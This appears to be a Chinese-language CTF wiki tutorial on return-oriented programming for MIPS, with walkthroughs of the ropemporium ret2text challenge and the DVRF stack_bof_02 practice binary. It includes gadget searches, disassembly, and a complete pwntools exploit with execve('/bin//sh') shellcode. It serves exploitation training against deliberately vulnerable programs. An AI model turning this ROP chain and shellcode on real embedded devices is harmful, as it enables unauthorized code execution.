# mips - ROP
## 介紹
本章目前只打算介紹 mips 下的 rop，其他漏洞的利用以後會逐漸介紹
## 預備知識
架構回顧見： https://ctf-wiki.github.io/ctf-wiki/assembly/mips/readme-zh/
棧結構如圖：
![img](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image001.gif)
有幾個特殊的地方需要注意

1. MIPS32架構中是沒有EBP寄存器的，程序函數調用的時候是將當前棧指針向下移動 n 比特到該函數的 stack frame 存儲組空間，函數返回的時候再加上偏移量恢復棧
2. 傳參過程中，前四個參數$a0-$a3，多餘的會保存在調用函數的預留的棧頂空間內
3. MIPS調用函數時會把函數的返回地址直接存入$RA 寄存器
## 簡單環境適配
我們目前以用戶態的形式調試程序, 所以需要安裝 且，qemu-user  等依賴
```bash
$ sudo apt install qemu-user
$ sudo apt install libc6-mipsel-cross
$ sudo mkdir /etc/qemu-binfmt
$ sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel
```
## 題目
### 1 ropemporium ret2text
跟到 pwnme 函數裏
![image-20201028010553089](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028010554.png)
我們可以看到函數一開始，將  ra 寄存器的值，放入 $sp+60 的位置裏。即返回地址位於 $sp+60
![image-20201028011257573](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028011258.png)
在看該函數裏的 read， a2 爲讀取的 size 大小，將被賦值爲 0x38，buf 爲位於 $sp + 0x18 的位置，明顯的一個棧溢出漏洞，且能覆蓋返回地址。
通過計算，可以計算出 padding 爲 36

```
60 - 0x18 = 36 
```
另外程序有一個 ret2win 函數
![image-20201028011734928](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028011736.png)
所以該題目只需覆蓋返回地址爲 ret2win 函數的地址即可。所以我們可以構造如下 payload：
```python
pay = 'A'*36 + p32(ret2win_addr)
```
即能 get flag
![image-20201028012453672](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028012455.png)
### 2 DVRF stack_bof_02.c
題目源碼如下
```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

//Simple BoF by b1ack0wl for E1550
//Shellcode is Required


int main(int argc, char **argv[]){
char buf[500] ="\0";

if (argc < 2){
printf("Usage: stack_bof_01 <argument>\r\n-By b1ack0wl\r\n");
exit(1);
} 


printf("Welcome to the Second BoF exercise! You'll need Shellcode for this! ;)\r\n\r\n"); 
strcpy(buf, argv[1]);

printf("You entered %s \r\n", buf);
printf("Try Again\r\n");

return 0;
}
```
安裝交叉編譯工具
```bash
sudo apt-get update
sudo apt-get install binutils-mipsel-linux-gnu
sudo apt-get install gcc-mipsel-linux-gnu
```
編譯上面的源碼
```bash
mipsel-linux-gnu-gcc -fno-stack-protector stack_bof_02.c -o stack_bof_02
```
程序保護
![image-20201028025116416](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028025118.png)
代碼邏輯很簡單，在 strcpy 的地方有一處棧溢出。

> 程序調試
`qemu-mipsel-static -g 1234 -L ./mipsel ./vuln_system  PAYLOAD`
-g 指定調試端口， -L 指定 lib 等文件的目錄，當程序起來之後
`gdb-multiarch stack_bof_02` 運行如下命令，然後在 gdb 裏運行 `target remote 127.0.0.1:1234` 即可掛上調試器
![image-20201028032102193](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028032104.png)
> 控制 PC
![image-20201028030936453](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028030938.png)
返回地址位於 $sp+532 , buf 位於 $fp+24
即 padding 爲 `pay += b'a'*508`
```python
# padding :532 - 24 = 508
from pwn import *

context.log_level = 'debug'

pay =  b''
pay += b'a'*508
pay += b'b'*4

# with open('payload','wb') as f:
#     f.write(pay)

p = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234','./stack_bof_02', pay])
# p = process(['qemu-mipsel-static', '-L', './mipsel', './stack_bof_02'])
pause()
p.interactive()
```
如下圖所示，即可控制 ra 寄存器，進而控制 PC
![image-20201028031118603](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028031120.png)
> 查找使用的 gadget 完成 ret2shellcode
由於程序沒有開啓 PIE 等 保護，所以我們可以直接在棧上注入 shellcode，然後控制 PC跳轉到棧上

找 gadget 我們可以使用 mipsrop.py 這個 ida 插件進行。

由於 mips 流水指令集的特點，存在 cache incoherency 的特性，需要調用 sleep 或者其他函數將數據區刷新到當前指令區中去，才能正常執行 shellcode。爲了找到更多的 gadget，以及這是一個 demo ，所有我們在 libc 裏查找
#### 1. 調用 sleep 函數
調用 sleep 函數之前，我們需要先找到對 a0 進行設置的 gadget
```
Python>mipsrop.find("li $a0, 1")
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x000B9350  |  li $a0,1                                            |  jalr  $s2                             |
|  0x000E2660  |  li $a0,1                                            |  jalr  $s2                             |
|  0x00109918  |  li $a0,1                                            |  jalr  $s1                             |
|  0x0010E604  |  li $a0,1                                            |  jalr  $s2                             |
|  0x0012D650  |  li $a0,1                                            |  jalr  $s0                             |
|  0x0012D658  |  li $a0,1                                            |  jalr  $s2                             |
|  0x00034C5C  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
|  0x00080100  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
|  0x00088E80  |  li $a0,1                                            |  jr    0x1C+var_s0($sp)                |
|  0x00091134  |  li $a0,1                                            |  jr    0x70+var_s24($sp)               |
|  0x00091BB0  |  li $a0,1                                            |  jr    0x70+var_s24($sp)               |
|  0x000D5460  |  li $a0,1                                            |  jr    0x1C+var_s10($sp)               |
|  0x000F2A80  |  li $a0,1                                            |  jr    0x1C+var_s0($sp)                |
|  0x001251C0  |  li $a0,1                                            |  jr    0x18+var_s14($sp)               |
----------------------------------------------------------------------------------------------------------------
Found 14 matching gadgets
```

例如我們這裏選擇了  0x00E2660 處的 gadget

```
.text:000E2660                 move    $t9, $s2
.text:000E2664                 jalr    $t9 ; sigprocmask
.text:000E2668                 li      $a0, 1
```

我們發現，這個 gadget 最後會跳到 s2 寄存器裏的值的位置，所以，我下一步需要找到能控制 s2 的寄存器

通常而言，我們這裏會使用 mipsrop 插件的 `mipsrop.tail()` 方法來尋找，從棧上設置寄存器的 gadget 

```
Python>mipsrop.tail()
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001E598  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x000F7758  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F776C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F7868  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F787C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x000F86D4  |  move $t9,$s4                                        |  jr    $s4                             |
|  0x000F8794  |  move $t9,$s5                                        |  jr    $s5                             |
|  0x00127E6C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012A80C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012A880  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0012F4A8  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0013032C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00130344  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00132C58  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00133888  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0013733C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137354  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137CDC  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00137CF4  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x00139BFC  |  move $t9,$s4                                        |  jr    $s4                             |
----------------------------------------------------------------------------------------------------------------
Found 20 matching gadgets
```
如果沒有合適的，我們可以嘗試找在一些 "*dir" 的函數結尾來查找，有沒有合適的，例如我在 readdir64 函數的末尾發現如下 gadget
![image-20201029161619764](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201029161619764.png)

這樣我們就能控制 s2 寄存器也能控制 PC，下一步就是跳到 sleep, 但是單純的跳到 sleep 是不夠的，同時我們要保證執行完 sleep 後能跳到下一個 gadget ，所以我們還需要一個既能 執行 sleep 又能控制下一個 PC 地址的 gadget
看了眼寄存器，此時 我們還能控制的還挺多，例如我這裏找 $a3 的寄存器
```
Python>mipsrop.find("mov $t9, $s3")
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001CE80  |  move $t9,$s3                                        |  jalr  $s3                             |
..........
|  0x000949EC  |  move $t9,$s3                                        |  jalr  $s3                             |
....
```
通過這個 gadget 我們先跳到 s3 的寄存器執行 sleep ，再通過控制的 ra 寄存器進行下一步操作


```
.text:000949EC                 move    $t9, $s3
.text:000949F0                 jalr    $t9 ; uselocale
.text:000949F4                 move    $s0, $v0
.text:000949F8
.text:000949F8 loc_949F8:                               # CODE XREF: strerror_l+15C↓j
.text:000949F8                 lw      $ra, 0x34($sp)
.text:000949FC                 move    $v0, $s0
.text:00094A00                 lw      $s3, 0x24+var_sC($sp)
.text:00094A04                 lw      $s2, 0x24+var_s8($sp)
.text:00094A08                 lw      $s1, 0x24+var_s4($sp)
.text:00094A0C                 lw      $s0, 0x24+var_s0($sp)
.text:00094A10                 jr      $ra
.text:00094A14                 addiu   $sp, 0x38
```
通過這個 gadget 我們先跳到 s3 的寄存器執行 sleep ，再通過控制的 ra 寄存器進行下一步操作
#### 2. jmp shellcode

下一步就是跳到 shellcode ，要跳到shellcode 我們先需要獲得棧地址

我們先用 `Python>mipsrop.stackfinder()`

獲得 如下 gadget

  ```asm
  .text:00095B74                 addiu   $a1, $sp, 52
  .text:00095B78                 sw      $zero, 24($sp)
  .text:00095B7C                 sw      $v0, 20($sp)
  .text:00095B80                 move    $a3, $s2
  .text:00095B84                 move    $t9, $s5
  .text:00095B88                 jalr    $t9
  ```
該 gadget 可以將棧地址， 即 $sp+24 的值賦值給 $a0 ，那麼這個棧就是我們即將填充 shellcode 的地方， $s5 可控，最後這段 gadget 會跳往 $s5 , 那麼我們只需要再找一個直接 jr $a0 的gadget 即可
```
  Python>mipsrop.find("move $t9, $a1")
  ----------------------------------------------------------------------------------------------------------------
  |  Address     |  Action                                              |  Control Jump                          |
  ----------------------------------------------------------------------------------------------------------------
  |  0x000FA0A0  |  move $t9,$a1                                        |  jalr  $a1                             |
  |  0x0012568C  |  move $t9,$a1                                        |  jalr  $a1                             |
  |  0x0012F4A8  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x0013032C  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00130344  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00132C58  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00133888  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x0013733C  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137354  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137CDC  |  move $t9,$a1                                        |  jr    $a1                             |
  |  0x00137CF4  |  move $t9,$a1                                        |  jr    $a1                             |
  ----------------------------------------------------------------------------------------------------------------
  Found 11 matching gadgets
```
這裏使用的是 
```
  .text:0012568C                 move    $t9, $a1
  .text:00125690                 move    $a3, $v0
  .text:00125694                 move    $a1, $a0
  .text:00125698                 jalr    $t9
```
最後的 exploit

```python
from pwn import *
# context.log_level = 'debug'
  
libc_base = 0x7f61f000
set_a0_addr = 0xE2660
#.text:000E2660                 move    $t9, $s2
#.text:000E2664                 jalr    $t9 ; sigprocmask
#.text:000E2668                 li      $a0, 1
set_s2_addr = 0xB2EE8
#.text:000B2EE8                 lw      $ra, 52($sp)
#.text:000B2EF0                 lw      $s6, 48($sp)
#.text:000B2EF4                 lw      $s5, 44($sp)
#.text:000B2EF8                 lw      $s4, 40($sp)
#.text:000B2EFC                 lw      $s3, 36($sp)
#.text:000B2F00                 lw      $s2, 32($sp)
#.text:000B2F04                 lw      $s1, 28($sp)
#.text:000B2F08                 lw      $s0, 24($sp)
#.text:000B2F0C                 jr      $ra
jr_t9_jr_ra = 0x949EC
# .text:000949EC                 move    $t9, $s3
# .text:000949F0                 jalr    $t9 ; uselocale
# .text:000949F4                 move    $s0, $v0
# .text:000949F8
# .text:000949F8 loc_949F8:                               # CODE XREF: strerror_l+15C↓j
# .text:000949F8                 lw      $ra, 0x34($sp)
# .text:000949FC                 move    $v0, $s0
# .text:00094A00                 lw      $s3, 0x24+var_sC($sp)
# .text:00094A04                 lw      $s2, 0x24+var_s8($sp)
# .text:00094A08                 lw      $s1, 0x24+var_s4($sp)
# .text:00094A0C                 lw      $s0, 0x24+var_s0($sp)
# .text:00094A10                 jr      $ra
addiu_a1_sp = 0x95B74
# .text:00095B74                 addiu   $a1, $sp, 52
# .text:00095B78                 sw      $zero, 24($sp)
# .text:00095B7C                 sw      $v0, 20($sp)
# .text:00095B80                 move    $a3, $s2
# .text:00095B84                 move    $t9, $s5
# .text:00095B88                 jalr    $t9
jr_a1 = 0x12568C
# .text:0012568C                 move    $t9, $a1
# .text:00125690                 move    $a3, $v0
# .text:00125694                 move    $a1, $a0
# .text:00125698                 jalr    $t9
sleep = 0xB8FC0

shellcode  = b""
shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962
shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873
shellcode += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
shellcode += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
shellcode += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
shellcode += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
shellcode += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1
shellcode += b"\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
shellcode += b"\x0c\x01\x01\x01"  # syscall 0x40404

pay =  b''
pay += b'a'*508
pay += p32(set_s2_addr+libc_base)
pay += b'b'*24
pay += b'1111'                    #s0
pay += b'2222'                    #s1
pay += p32(jr_t9_jr_ra+libc_base) #s2 - > set a0 
pay += p32(sleep+libc_base)       #s3
pay += b'5555'                    #s4
pay += p32(jr_a1+libc_base)     #s5
pay += b'7777'                    #s6
pay += p32(set_a0_addr+libc_base)
pay += b'c'*0x34
pay += p32(addiu_a1_sp+libc_base)
pay += b'd'*52
pay += shellcode

log.info(hex(0x94A10+libc_base))
log.info('addiu_a0_sp_24: {}'.format(hex(addiu_a1_sp+libc_base)))
with open('payload','wb') as f:
    f.write(pay)
# p = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234','./stack_bof_02', pay])
p = process(['qemu-mipsel-static', '-L', './mipsel', './stack_bof_02',pay])
pause()
p.interactive()
```

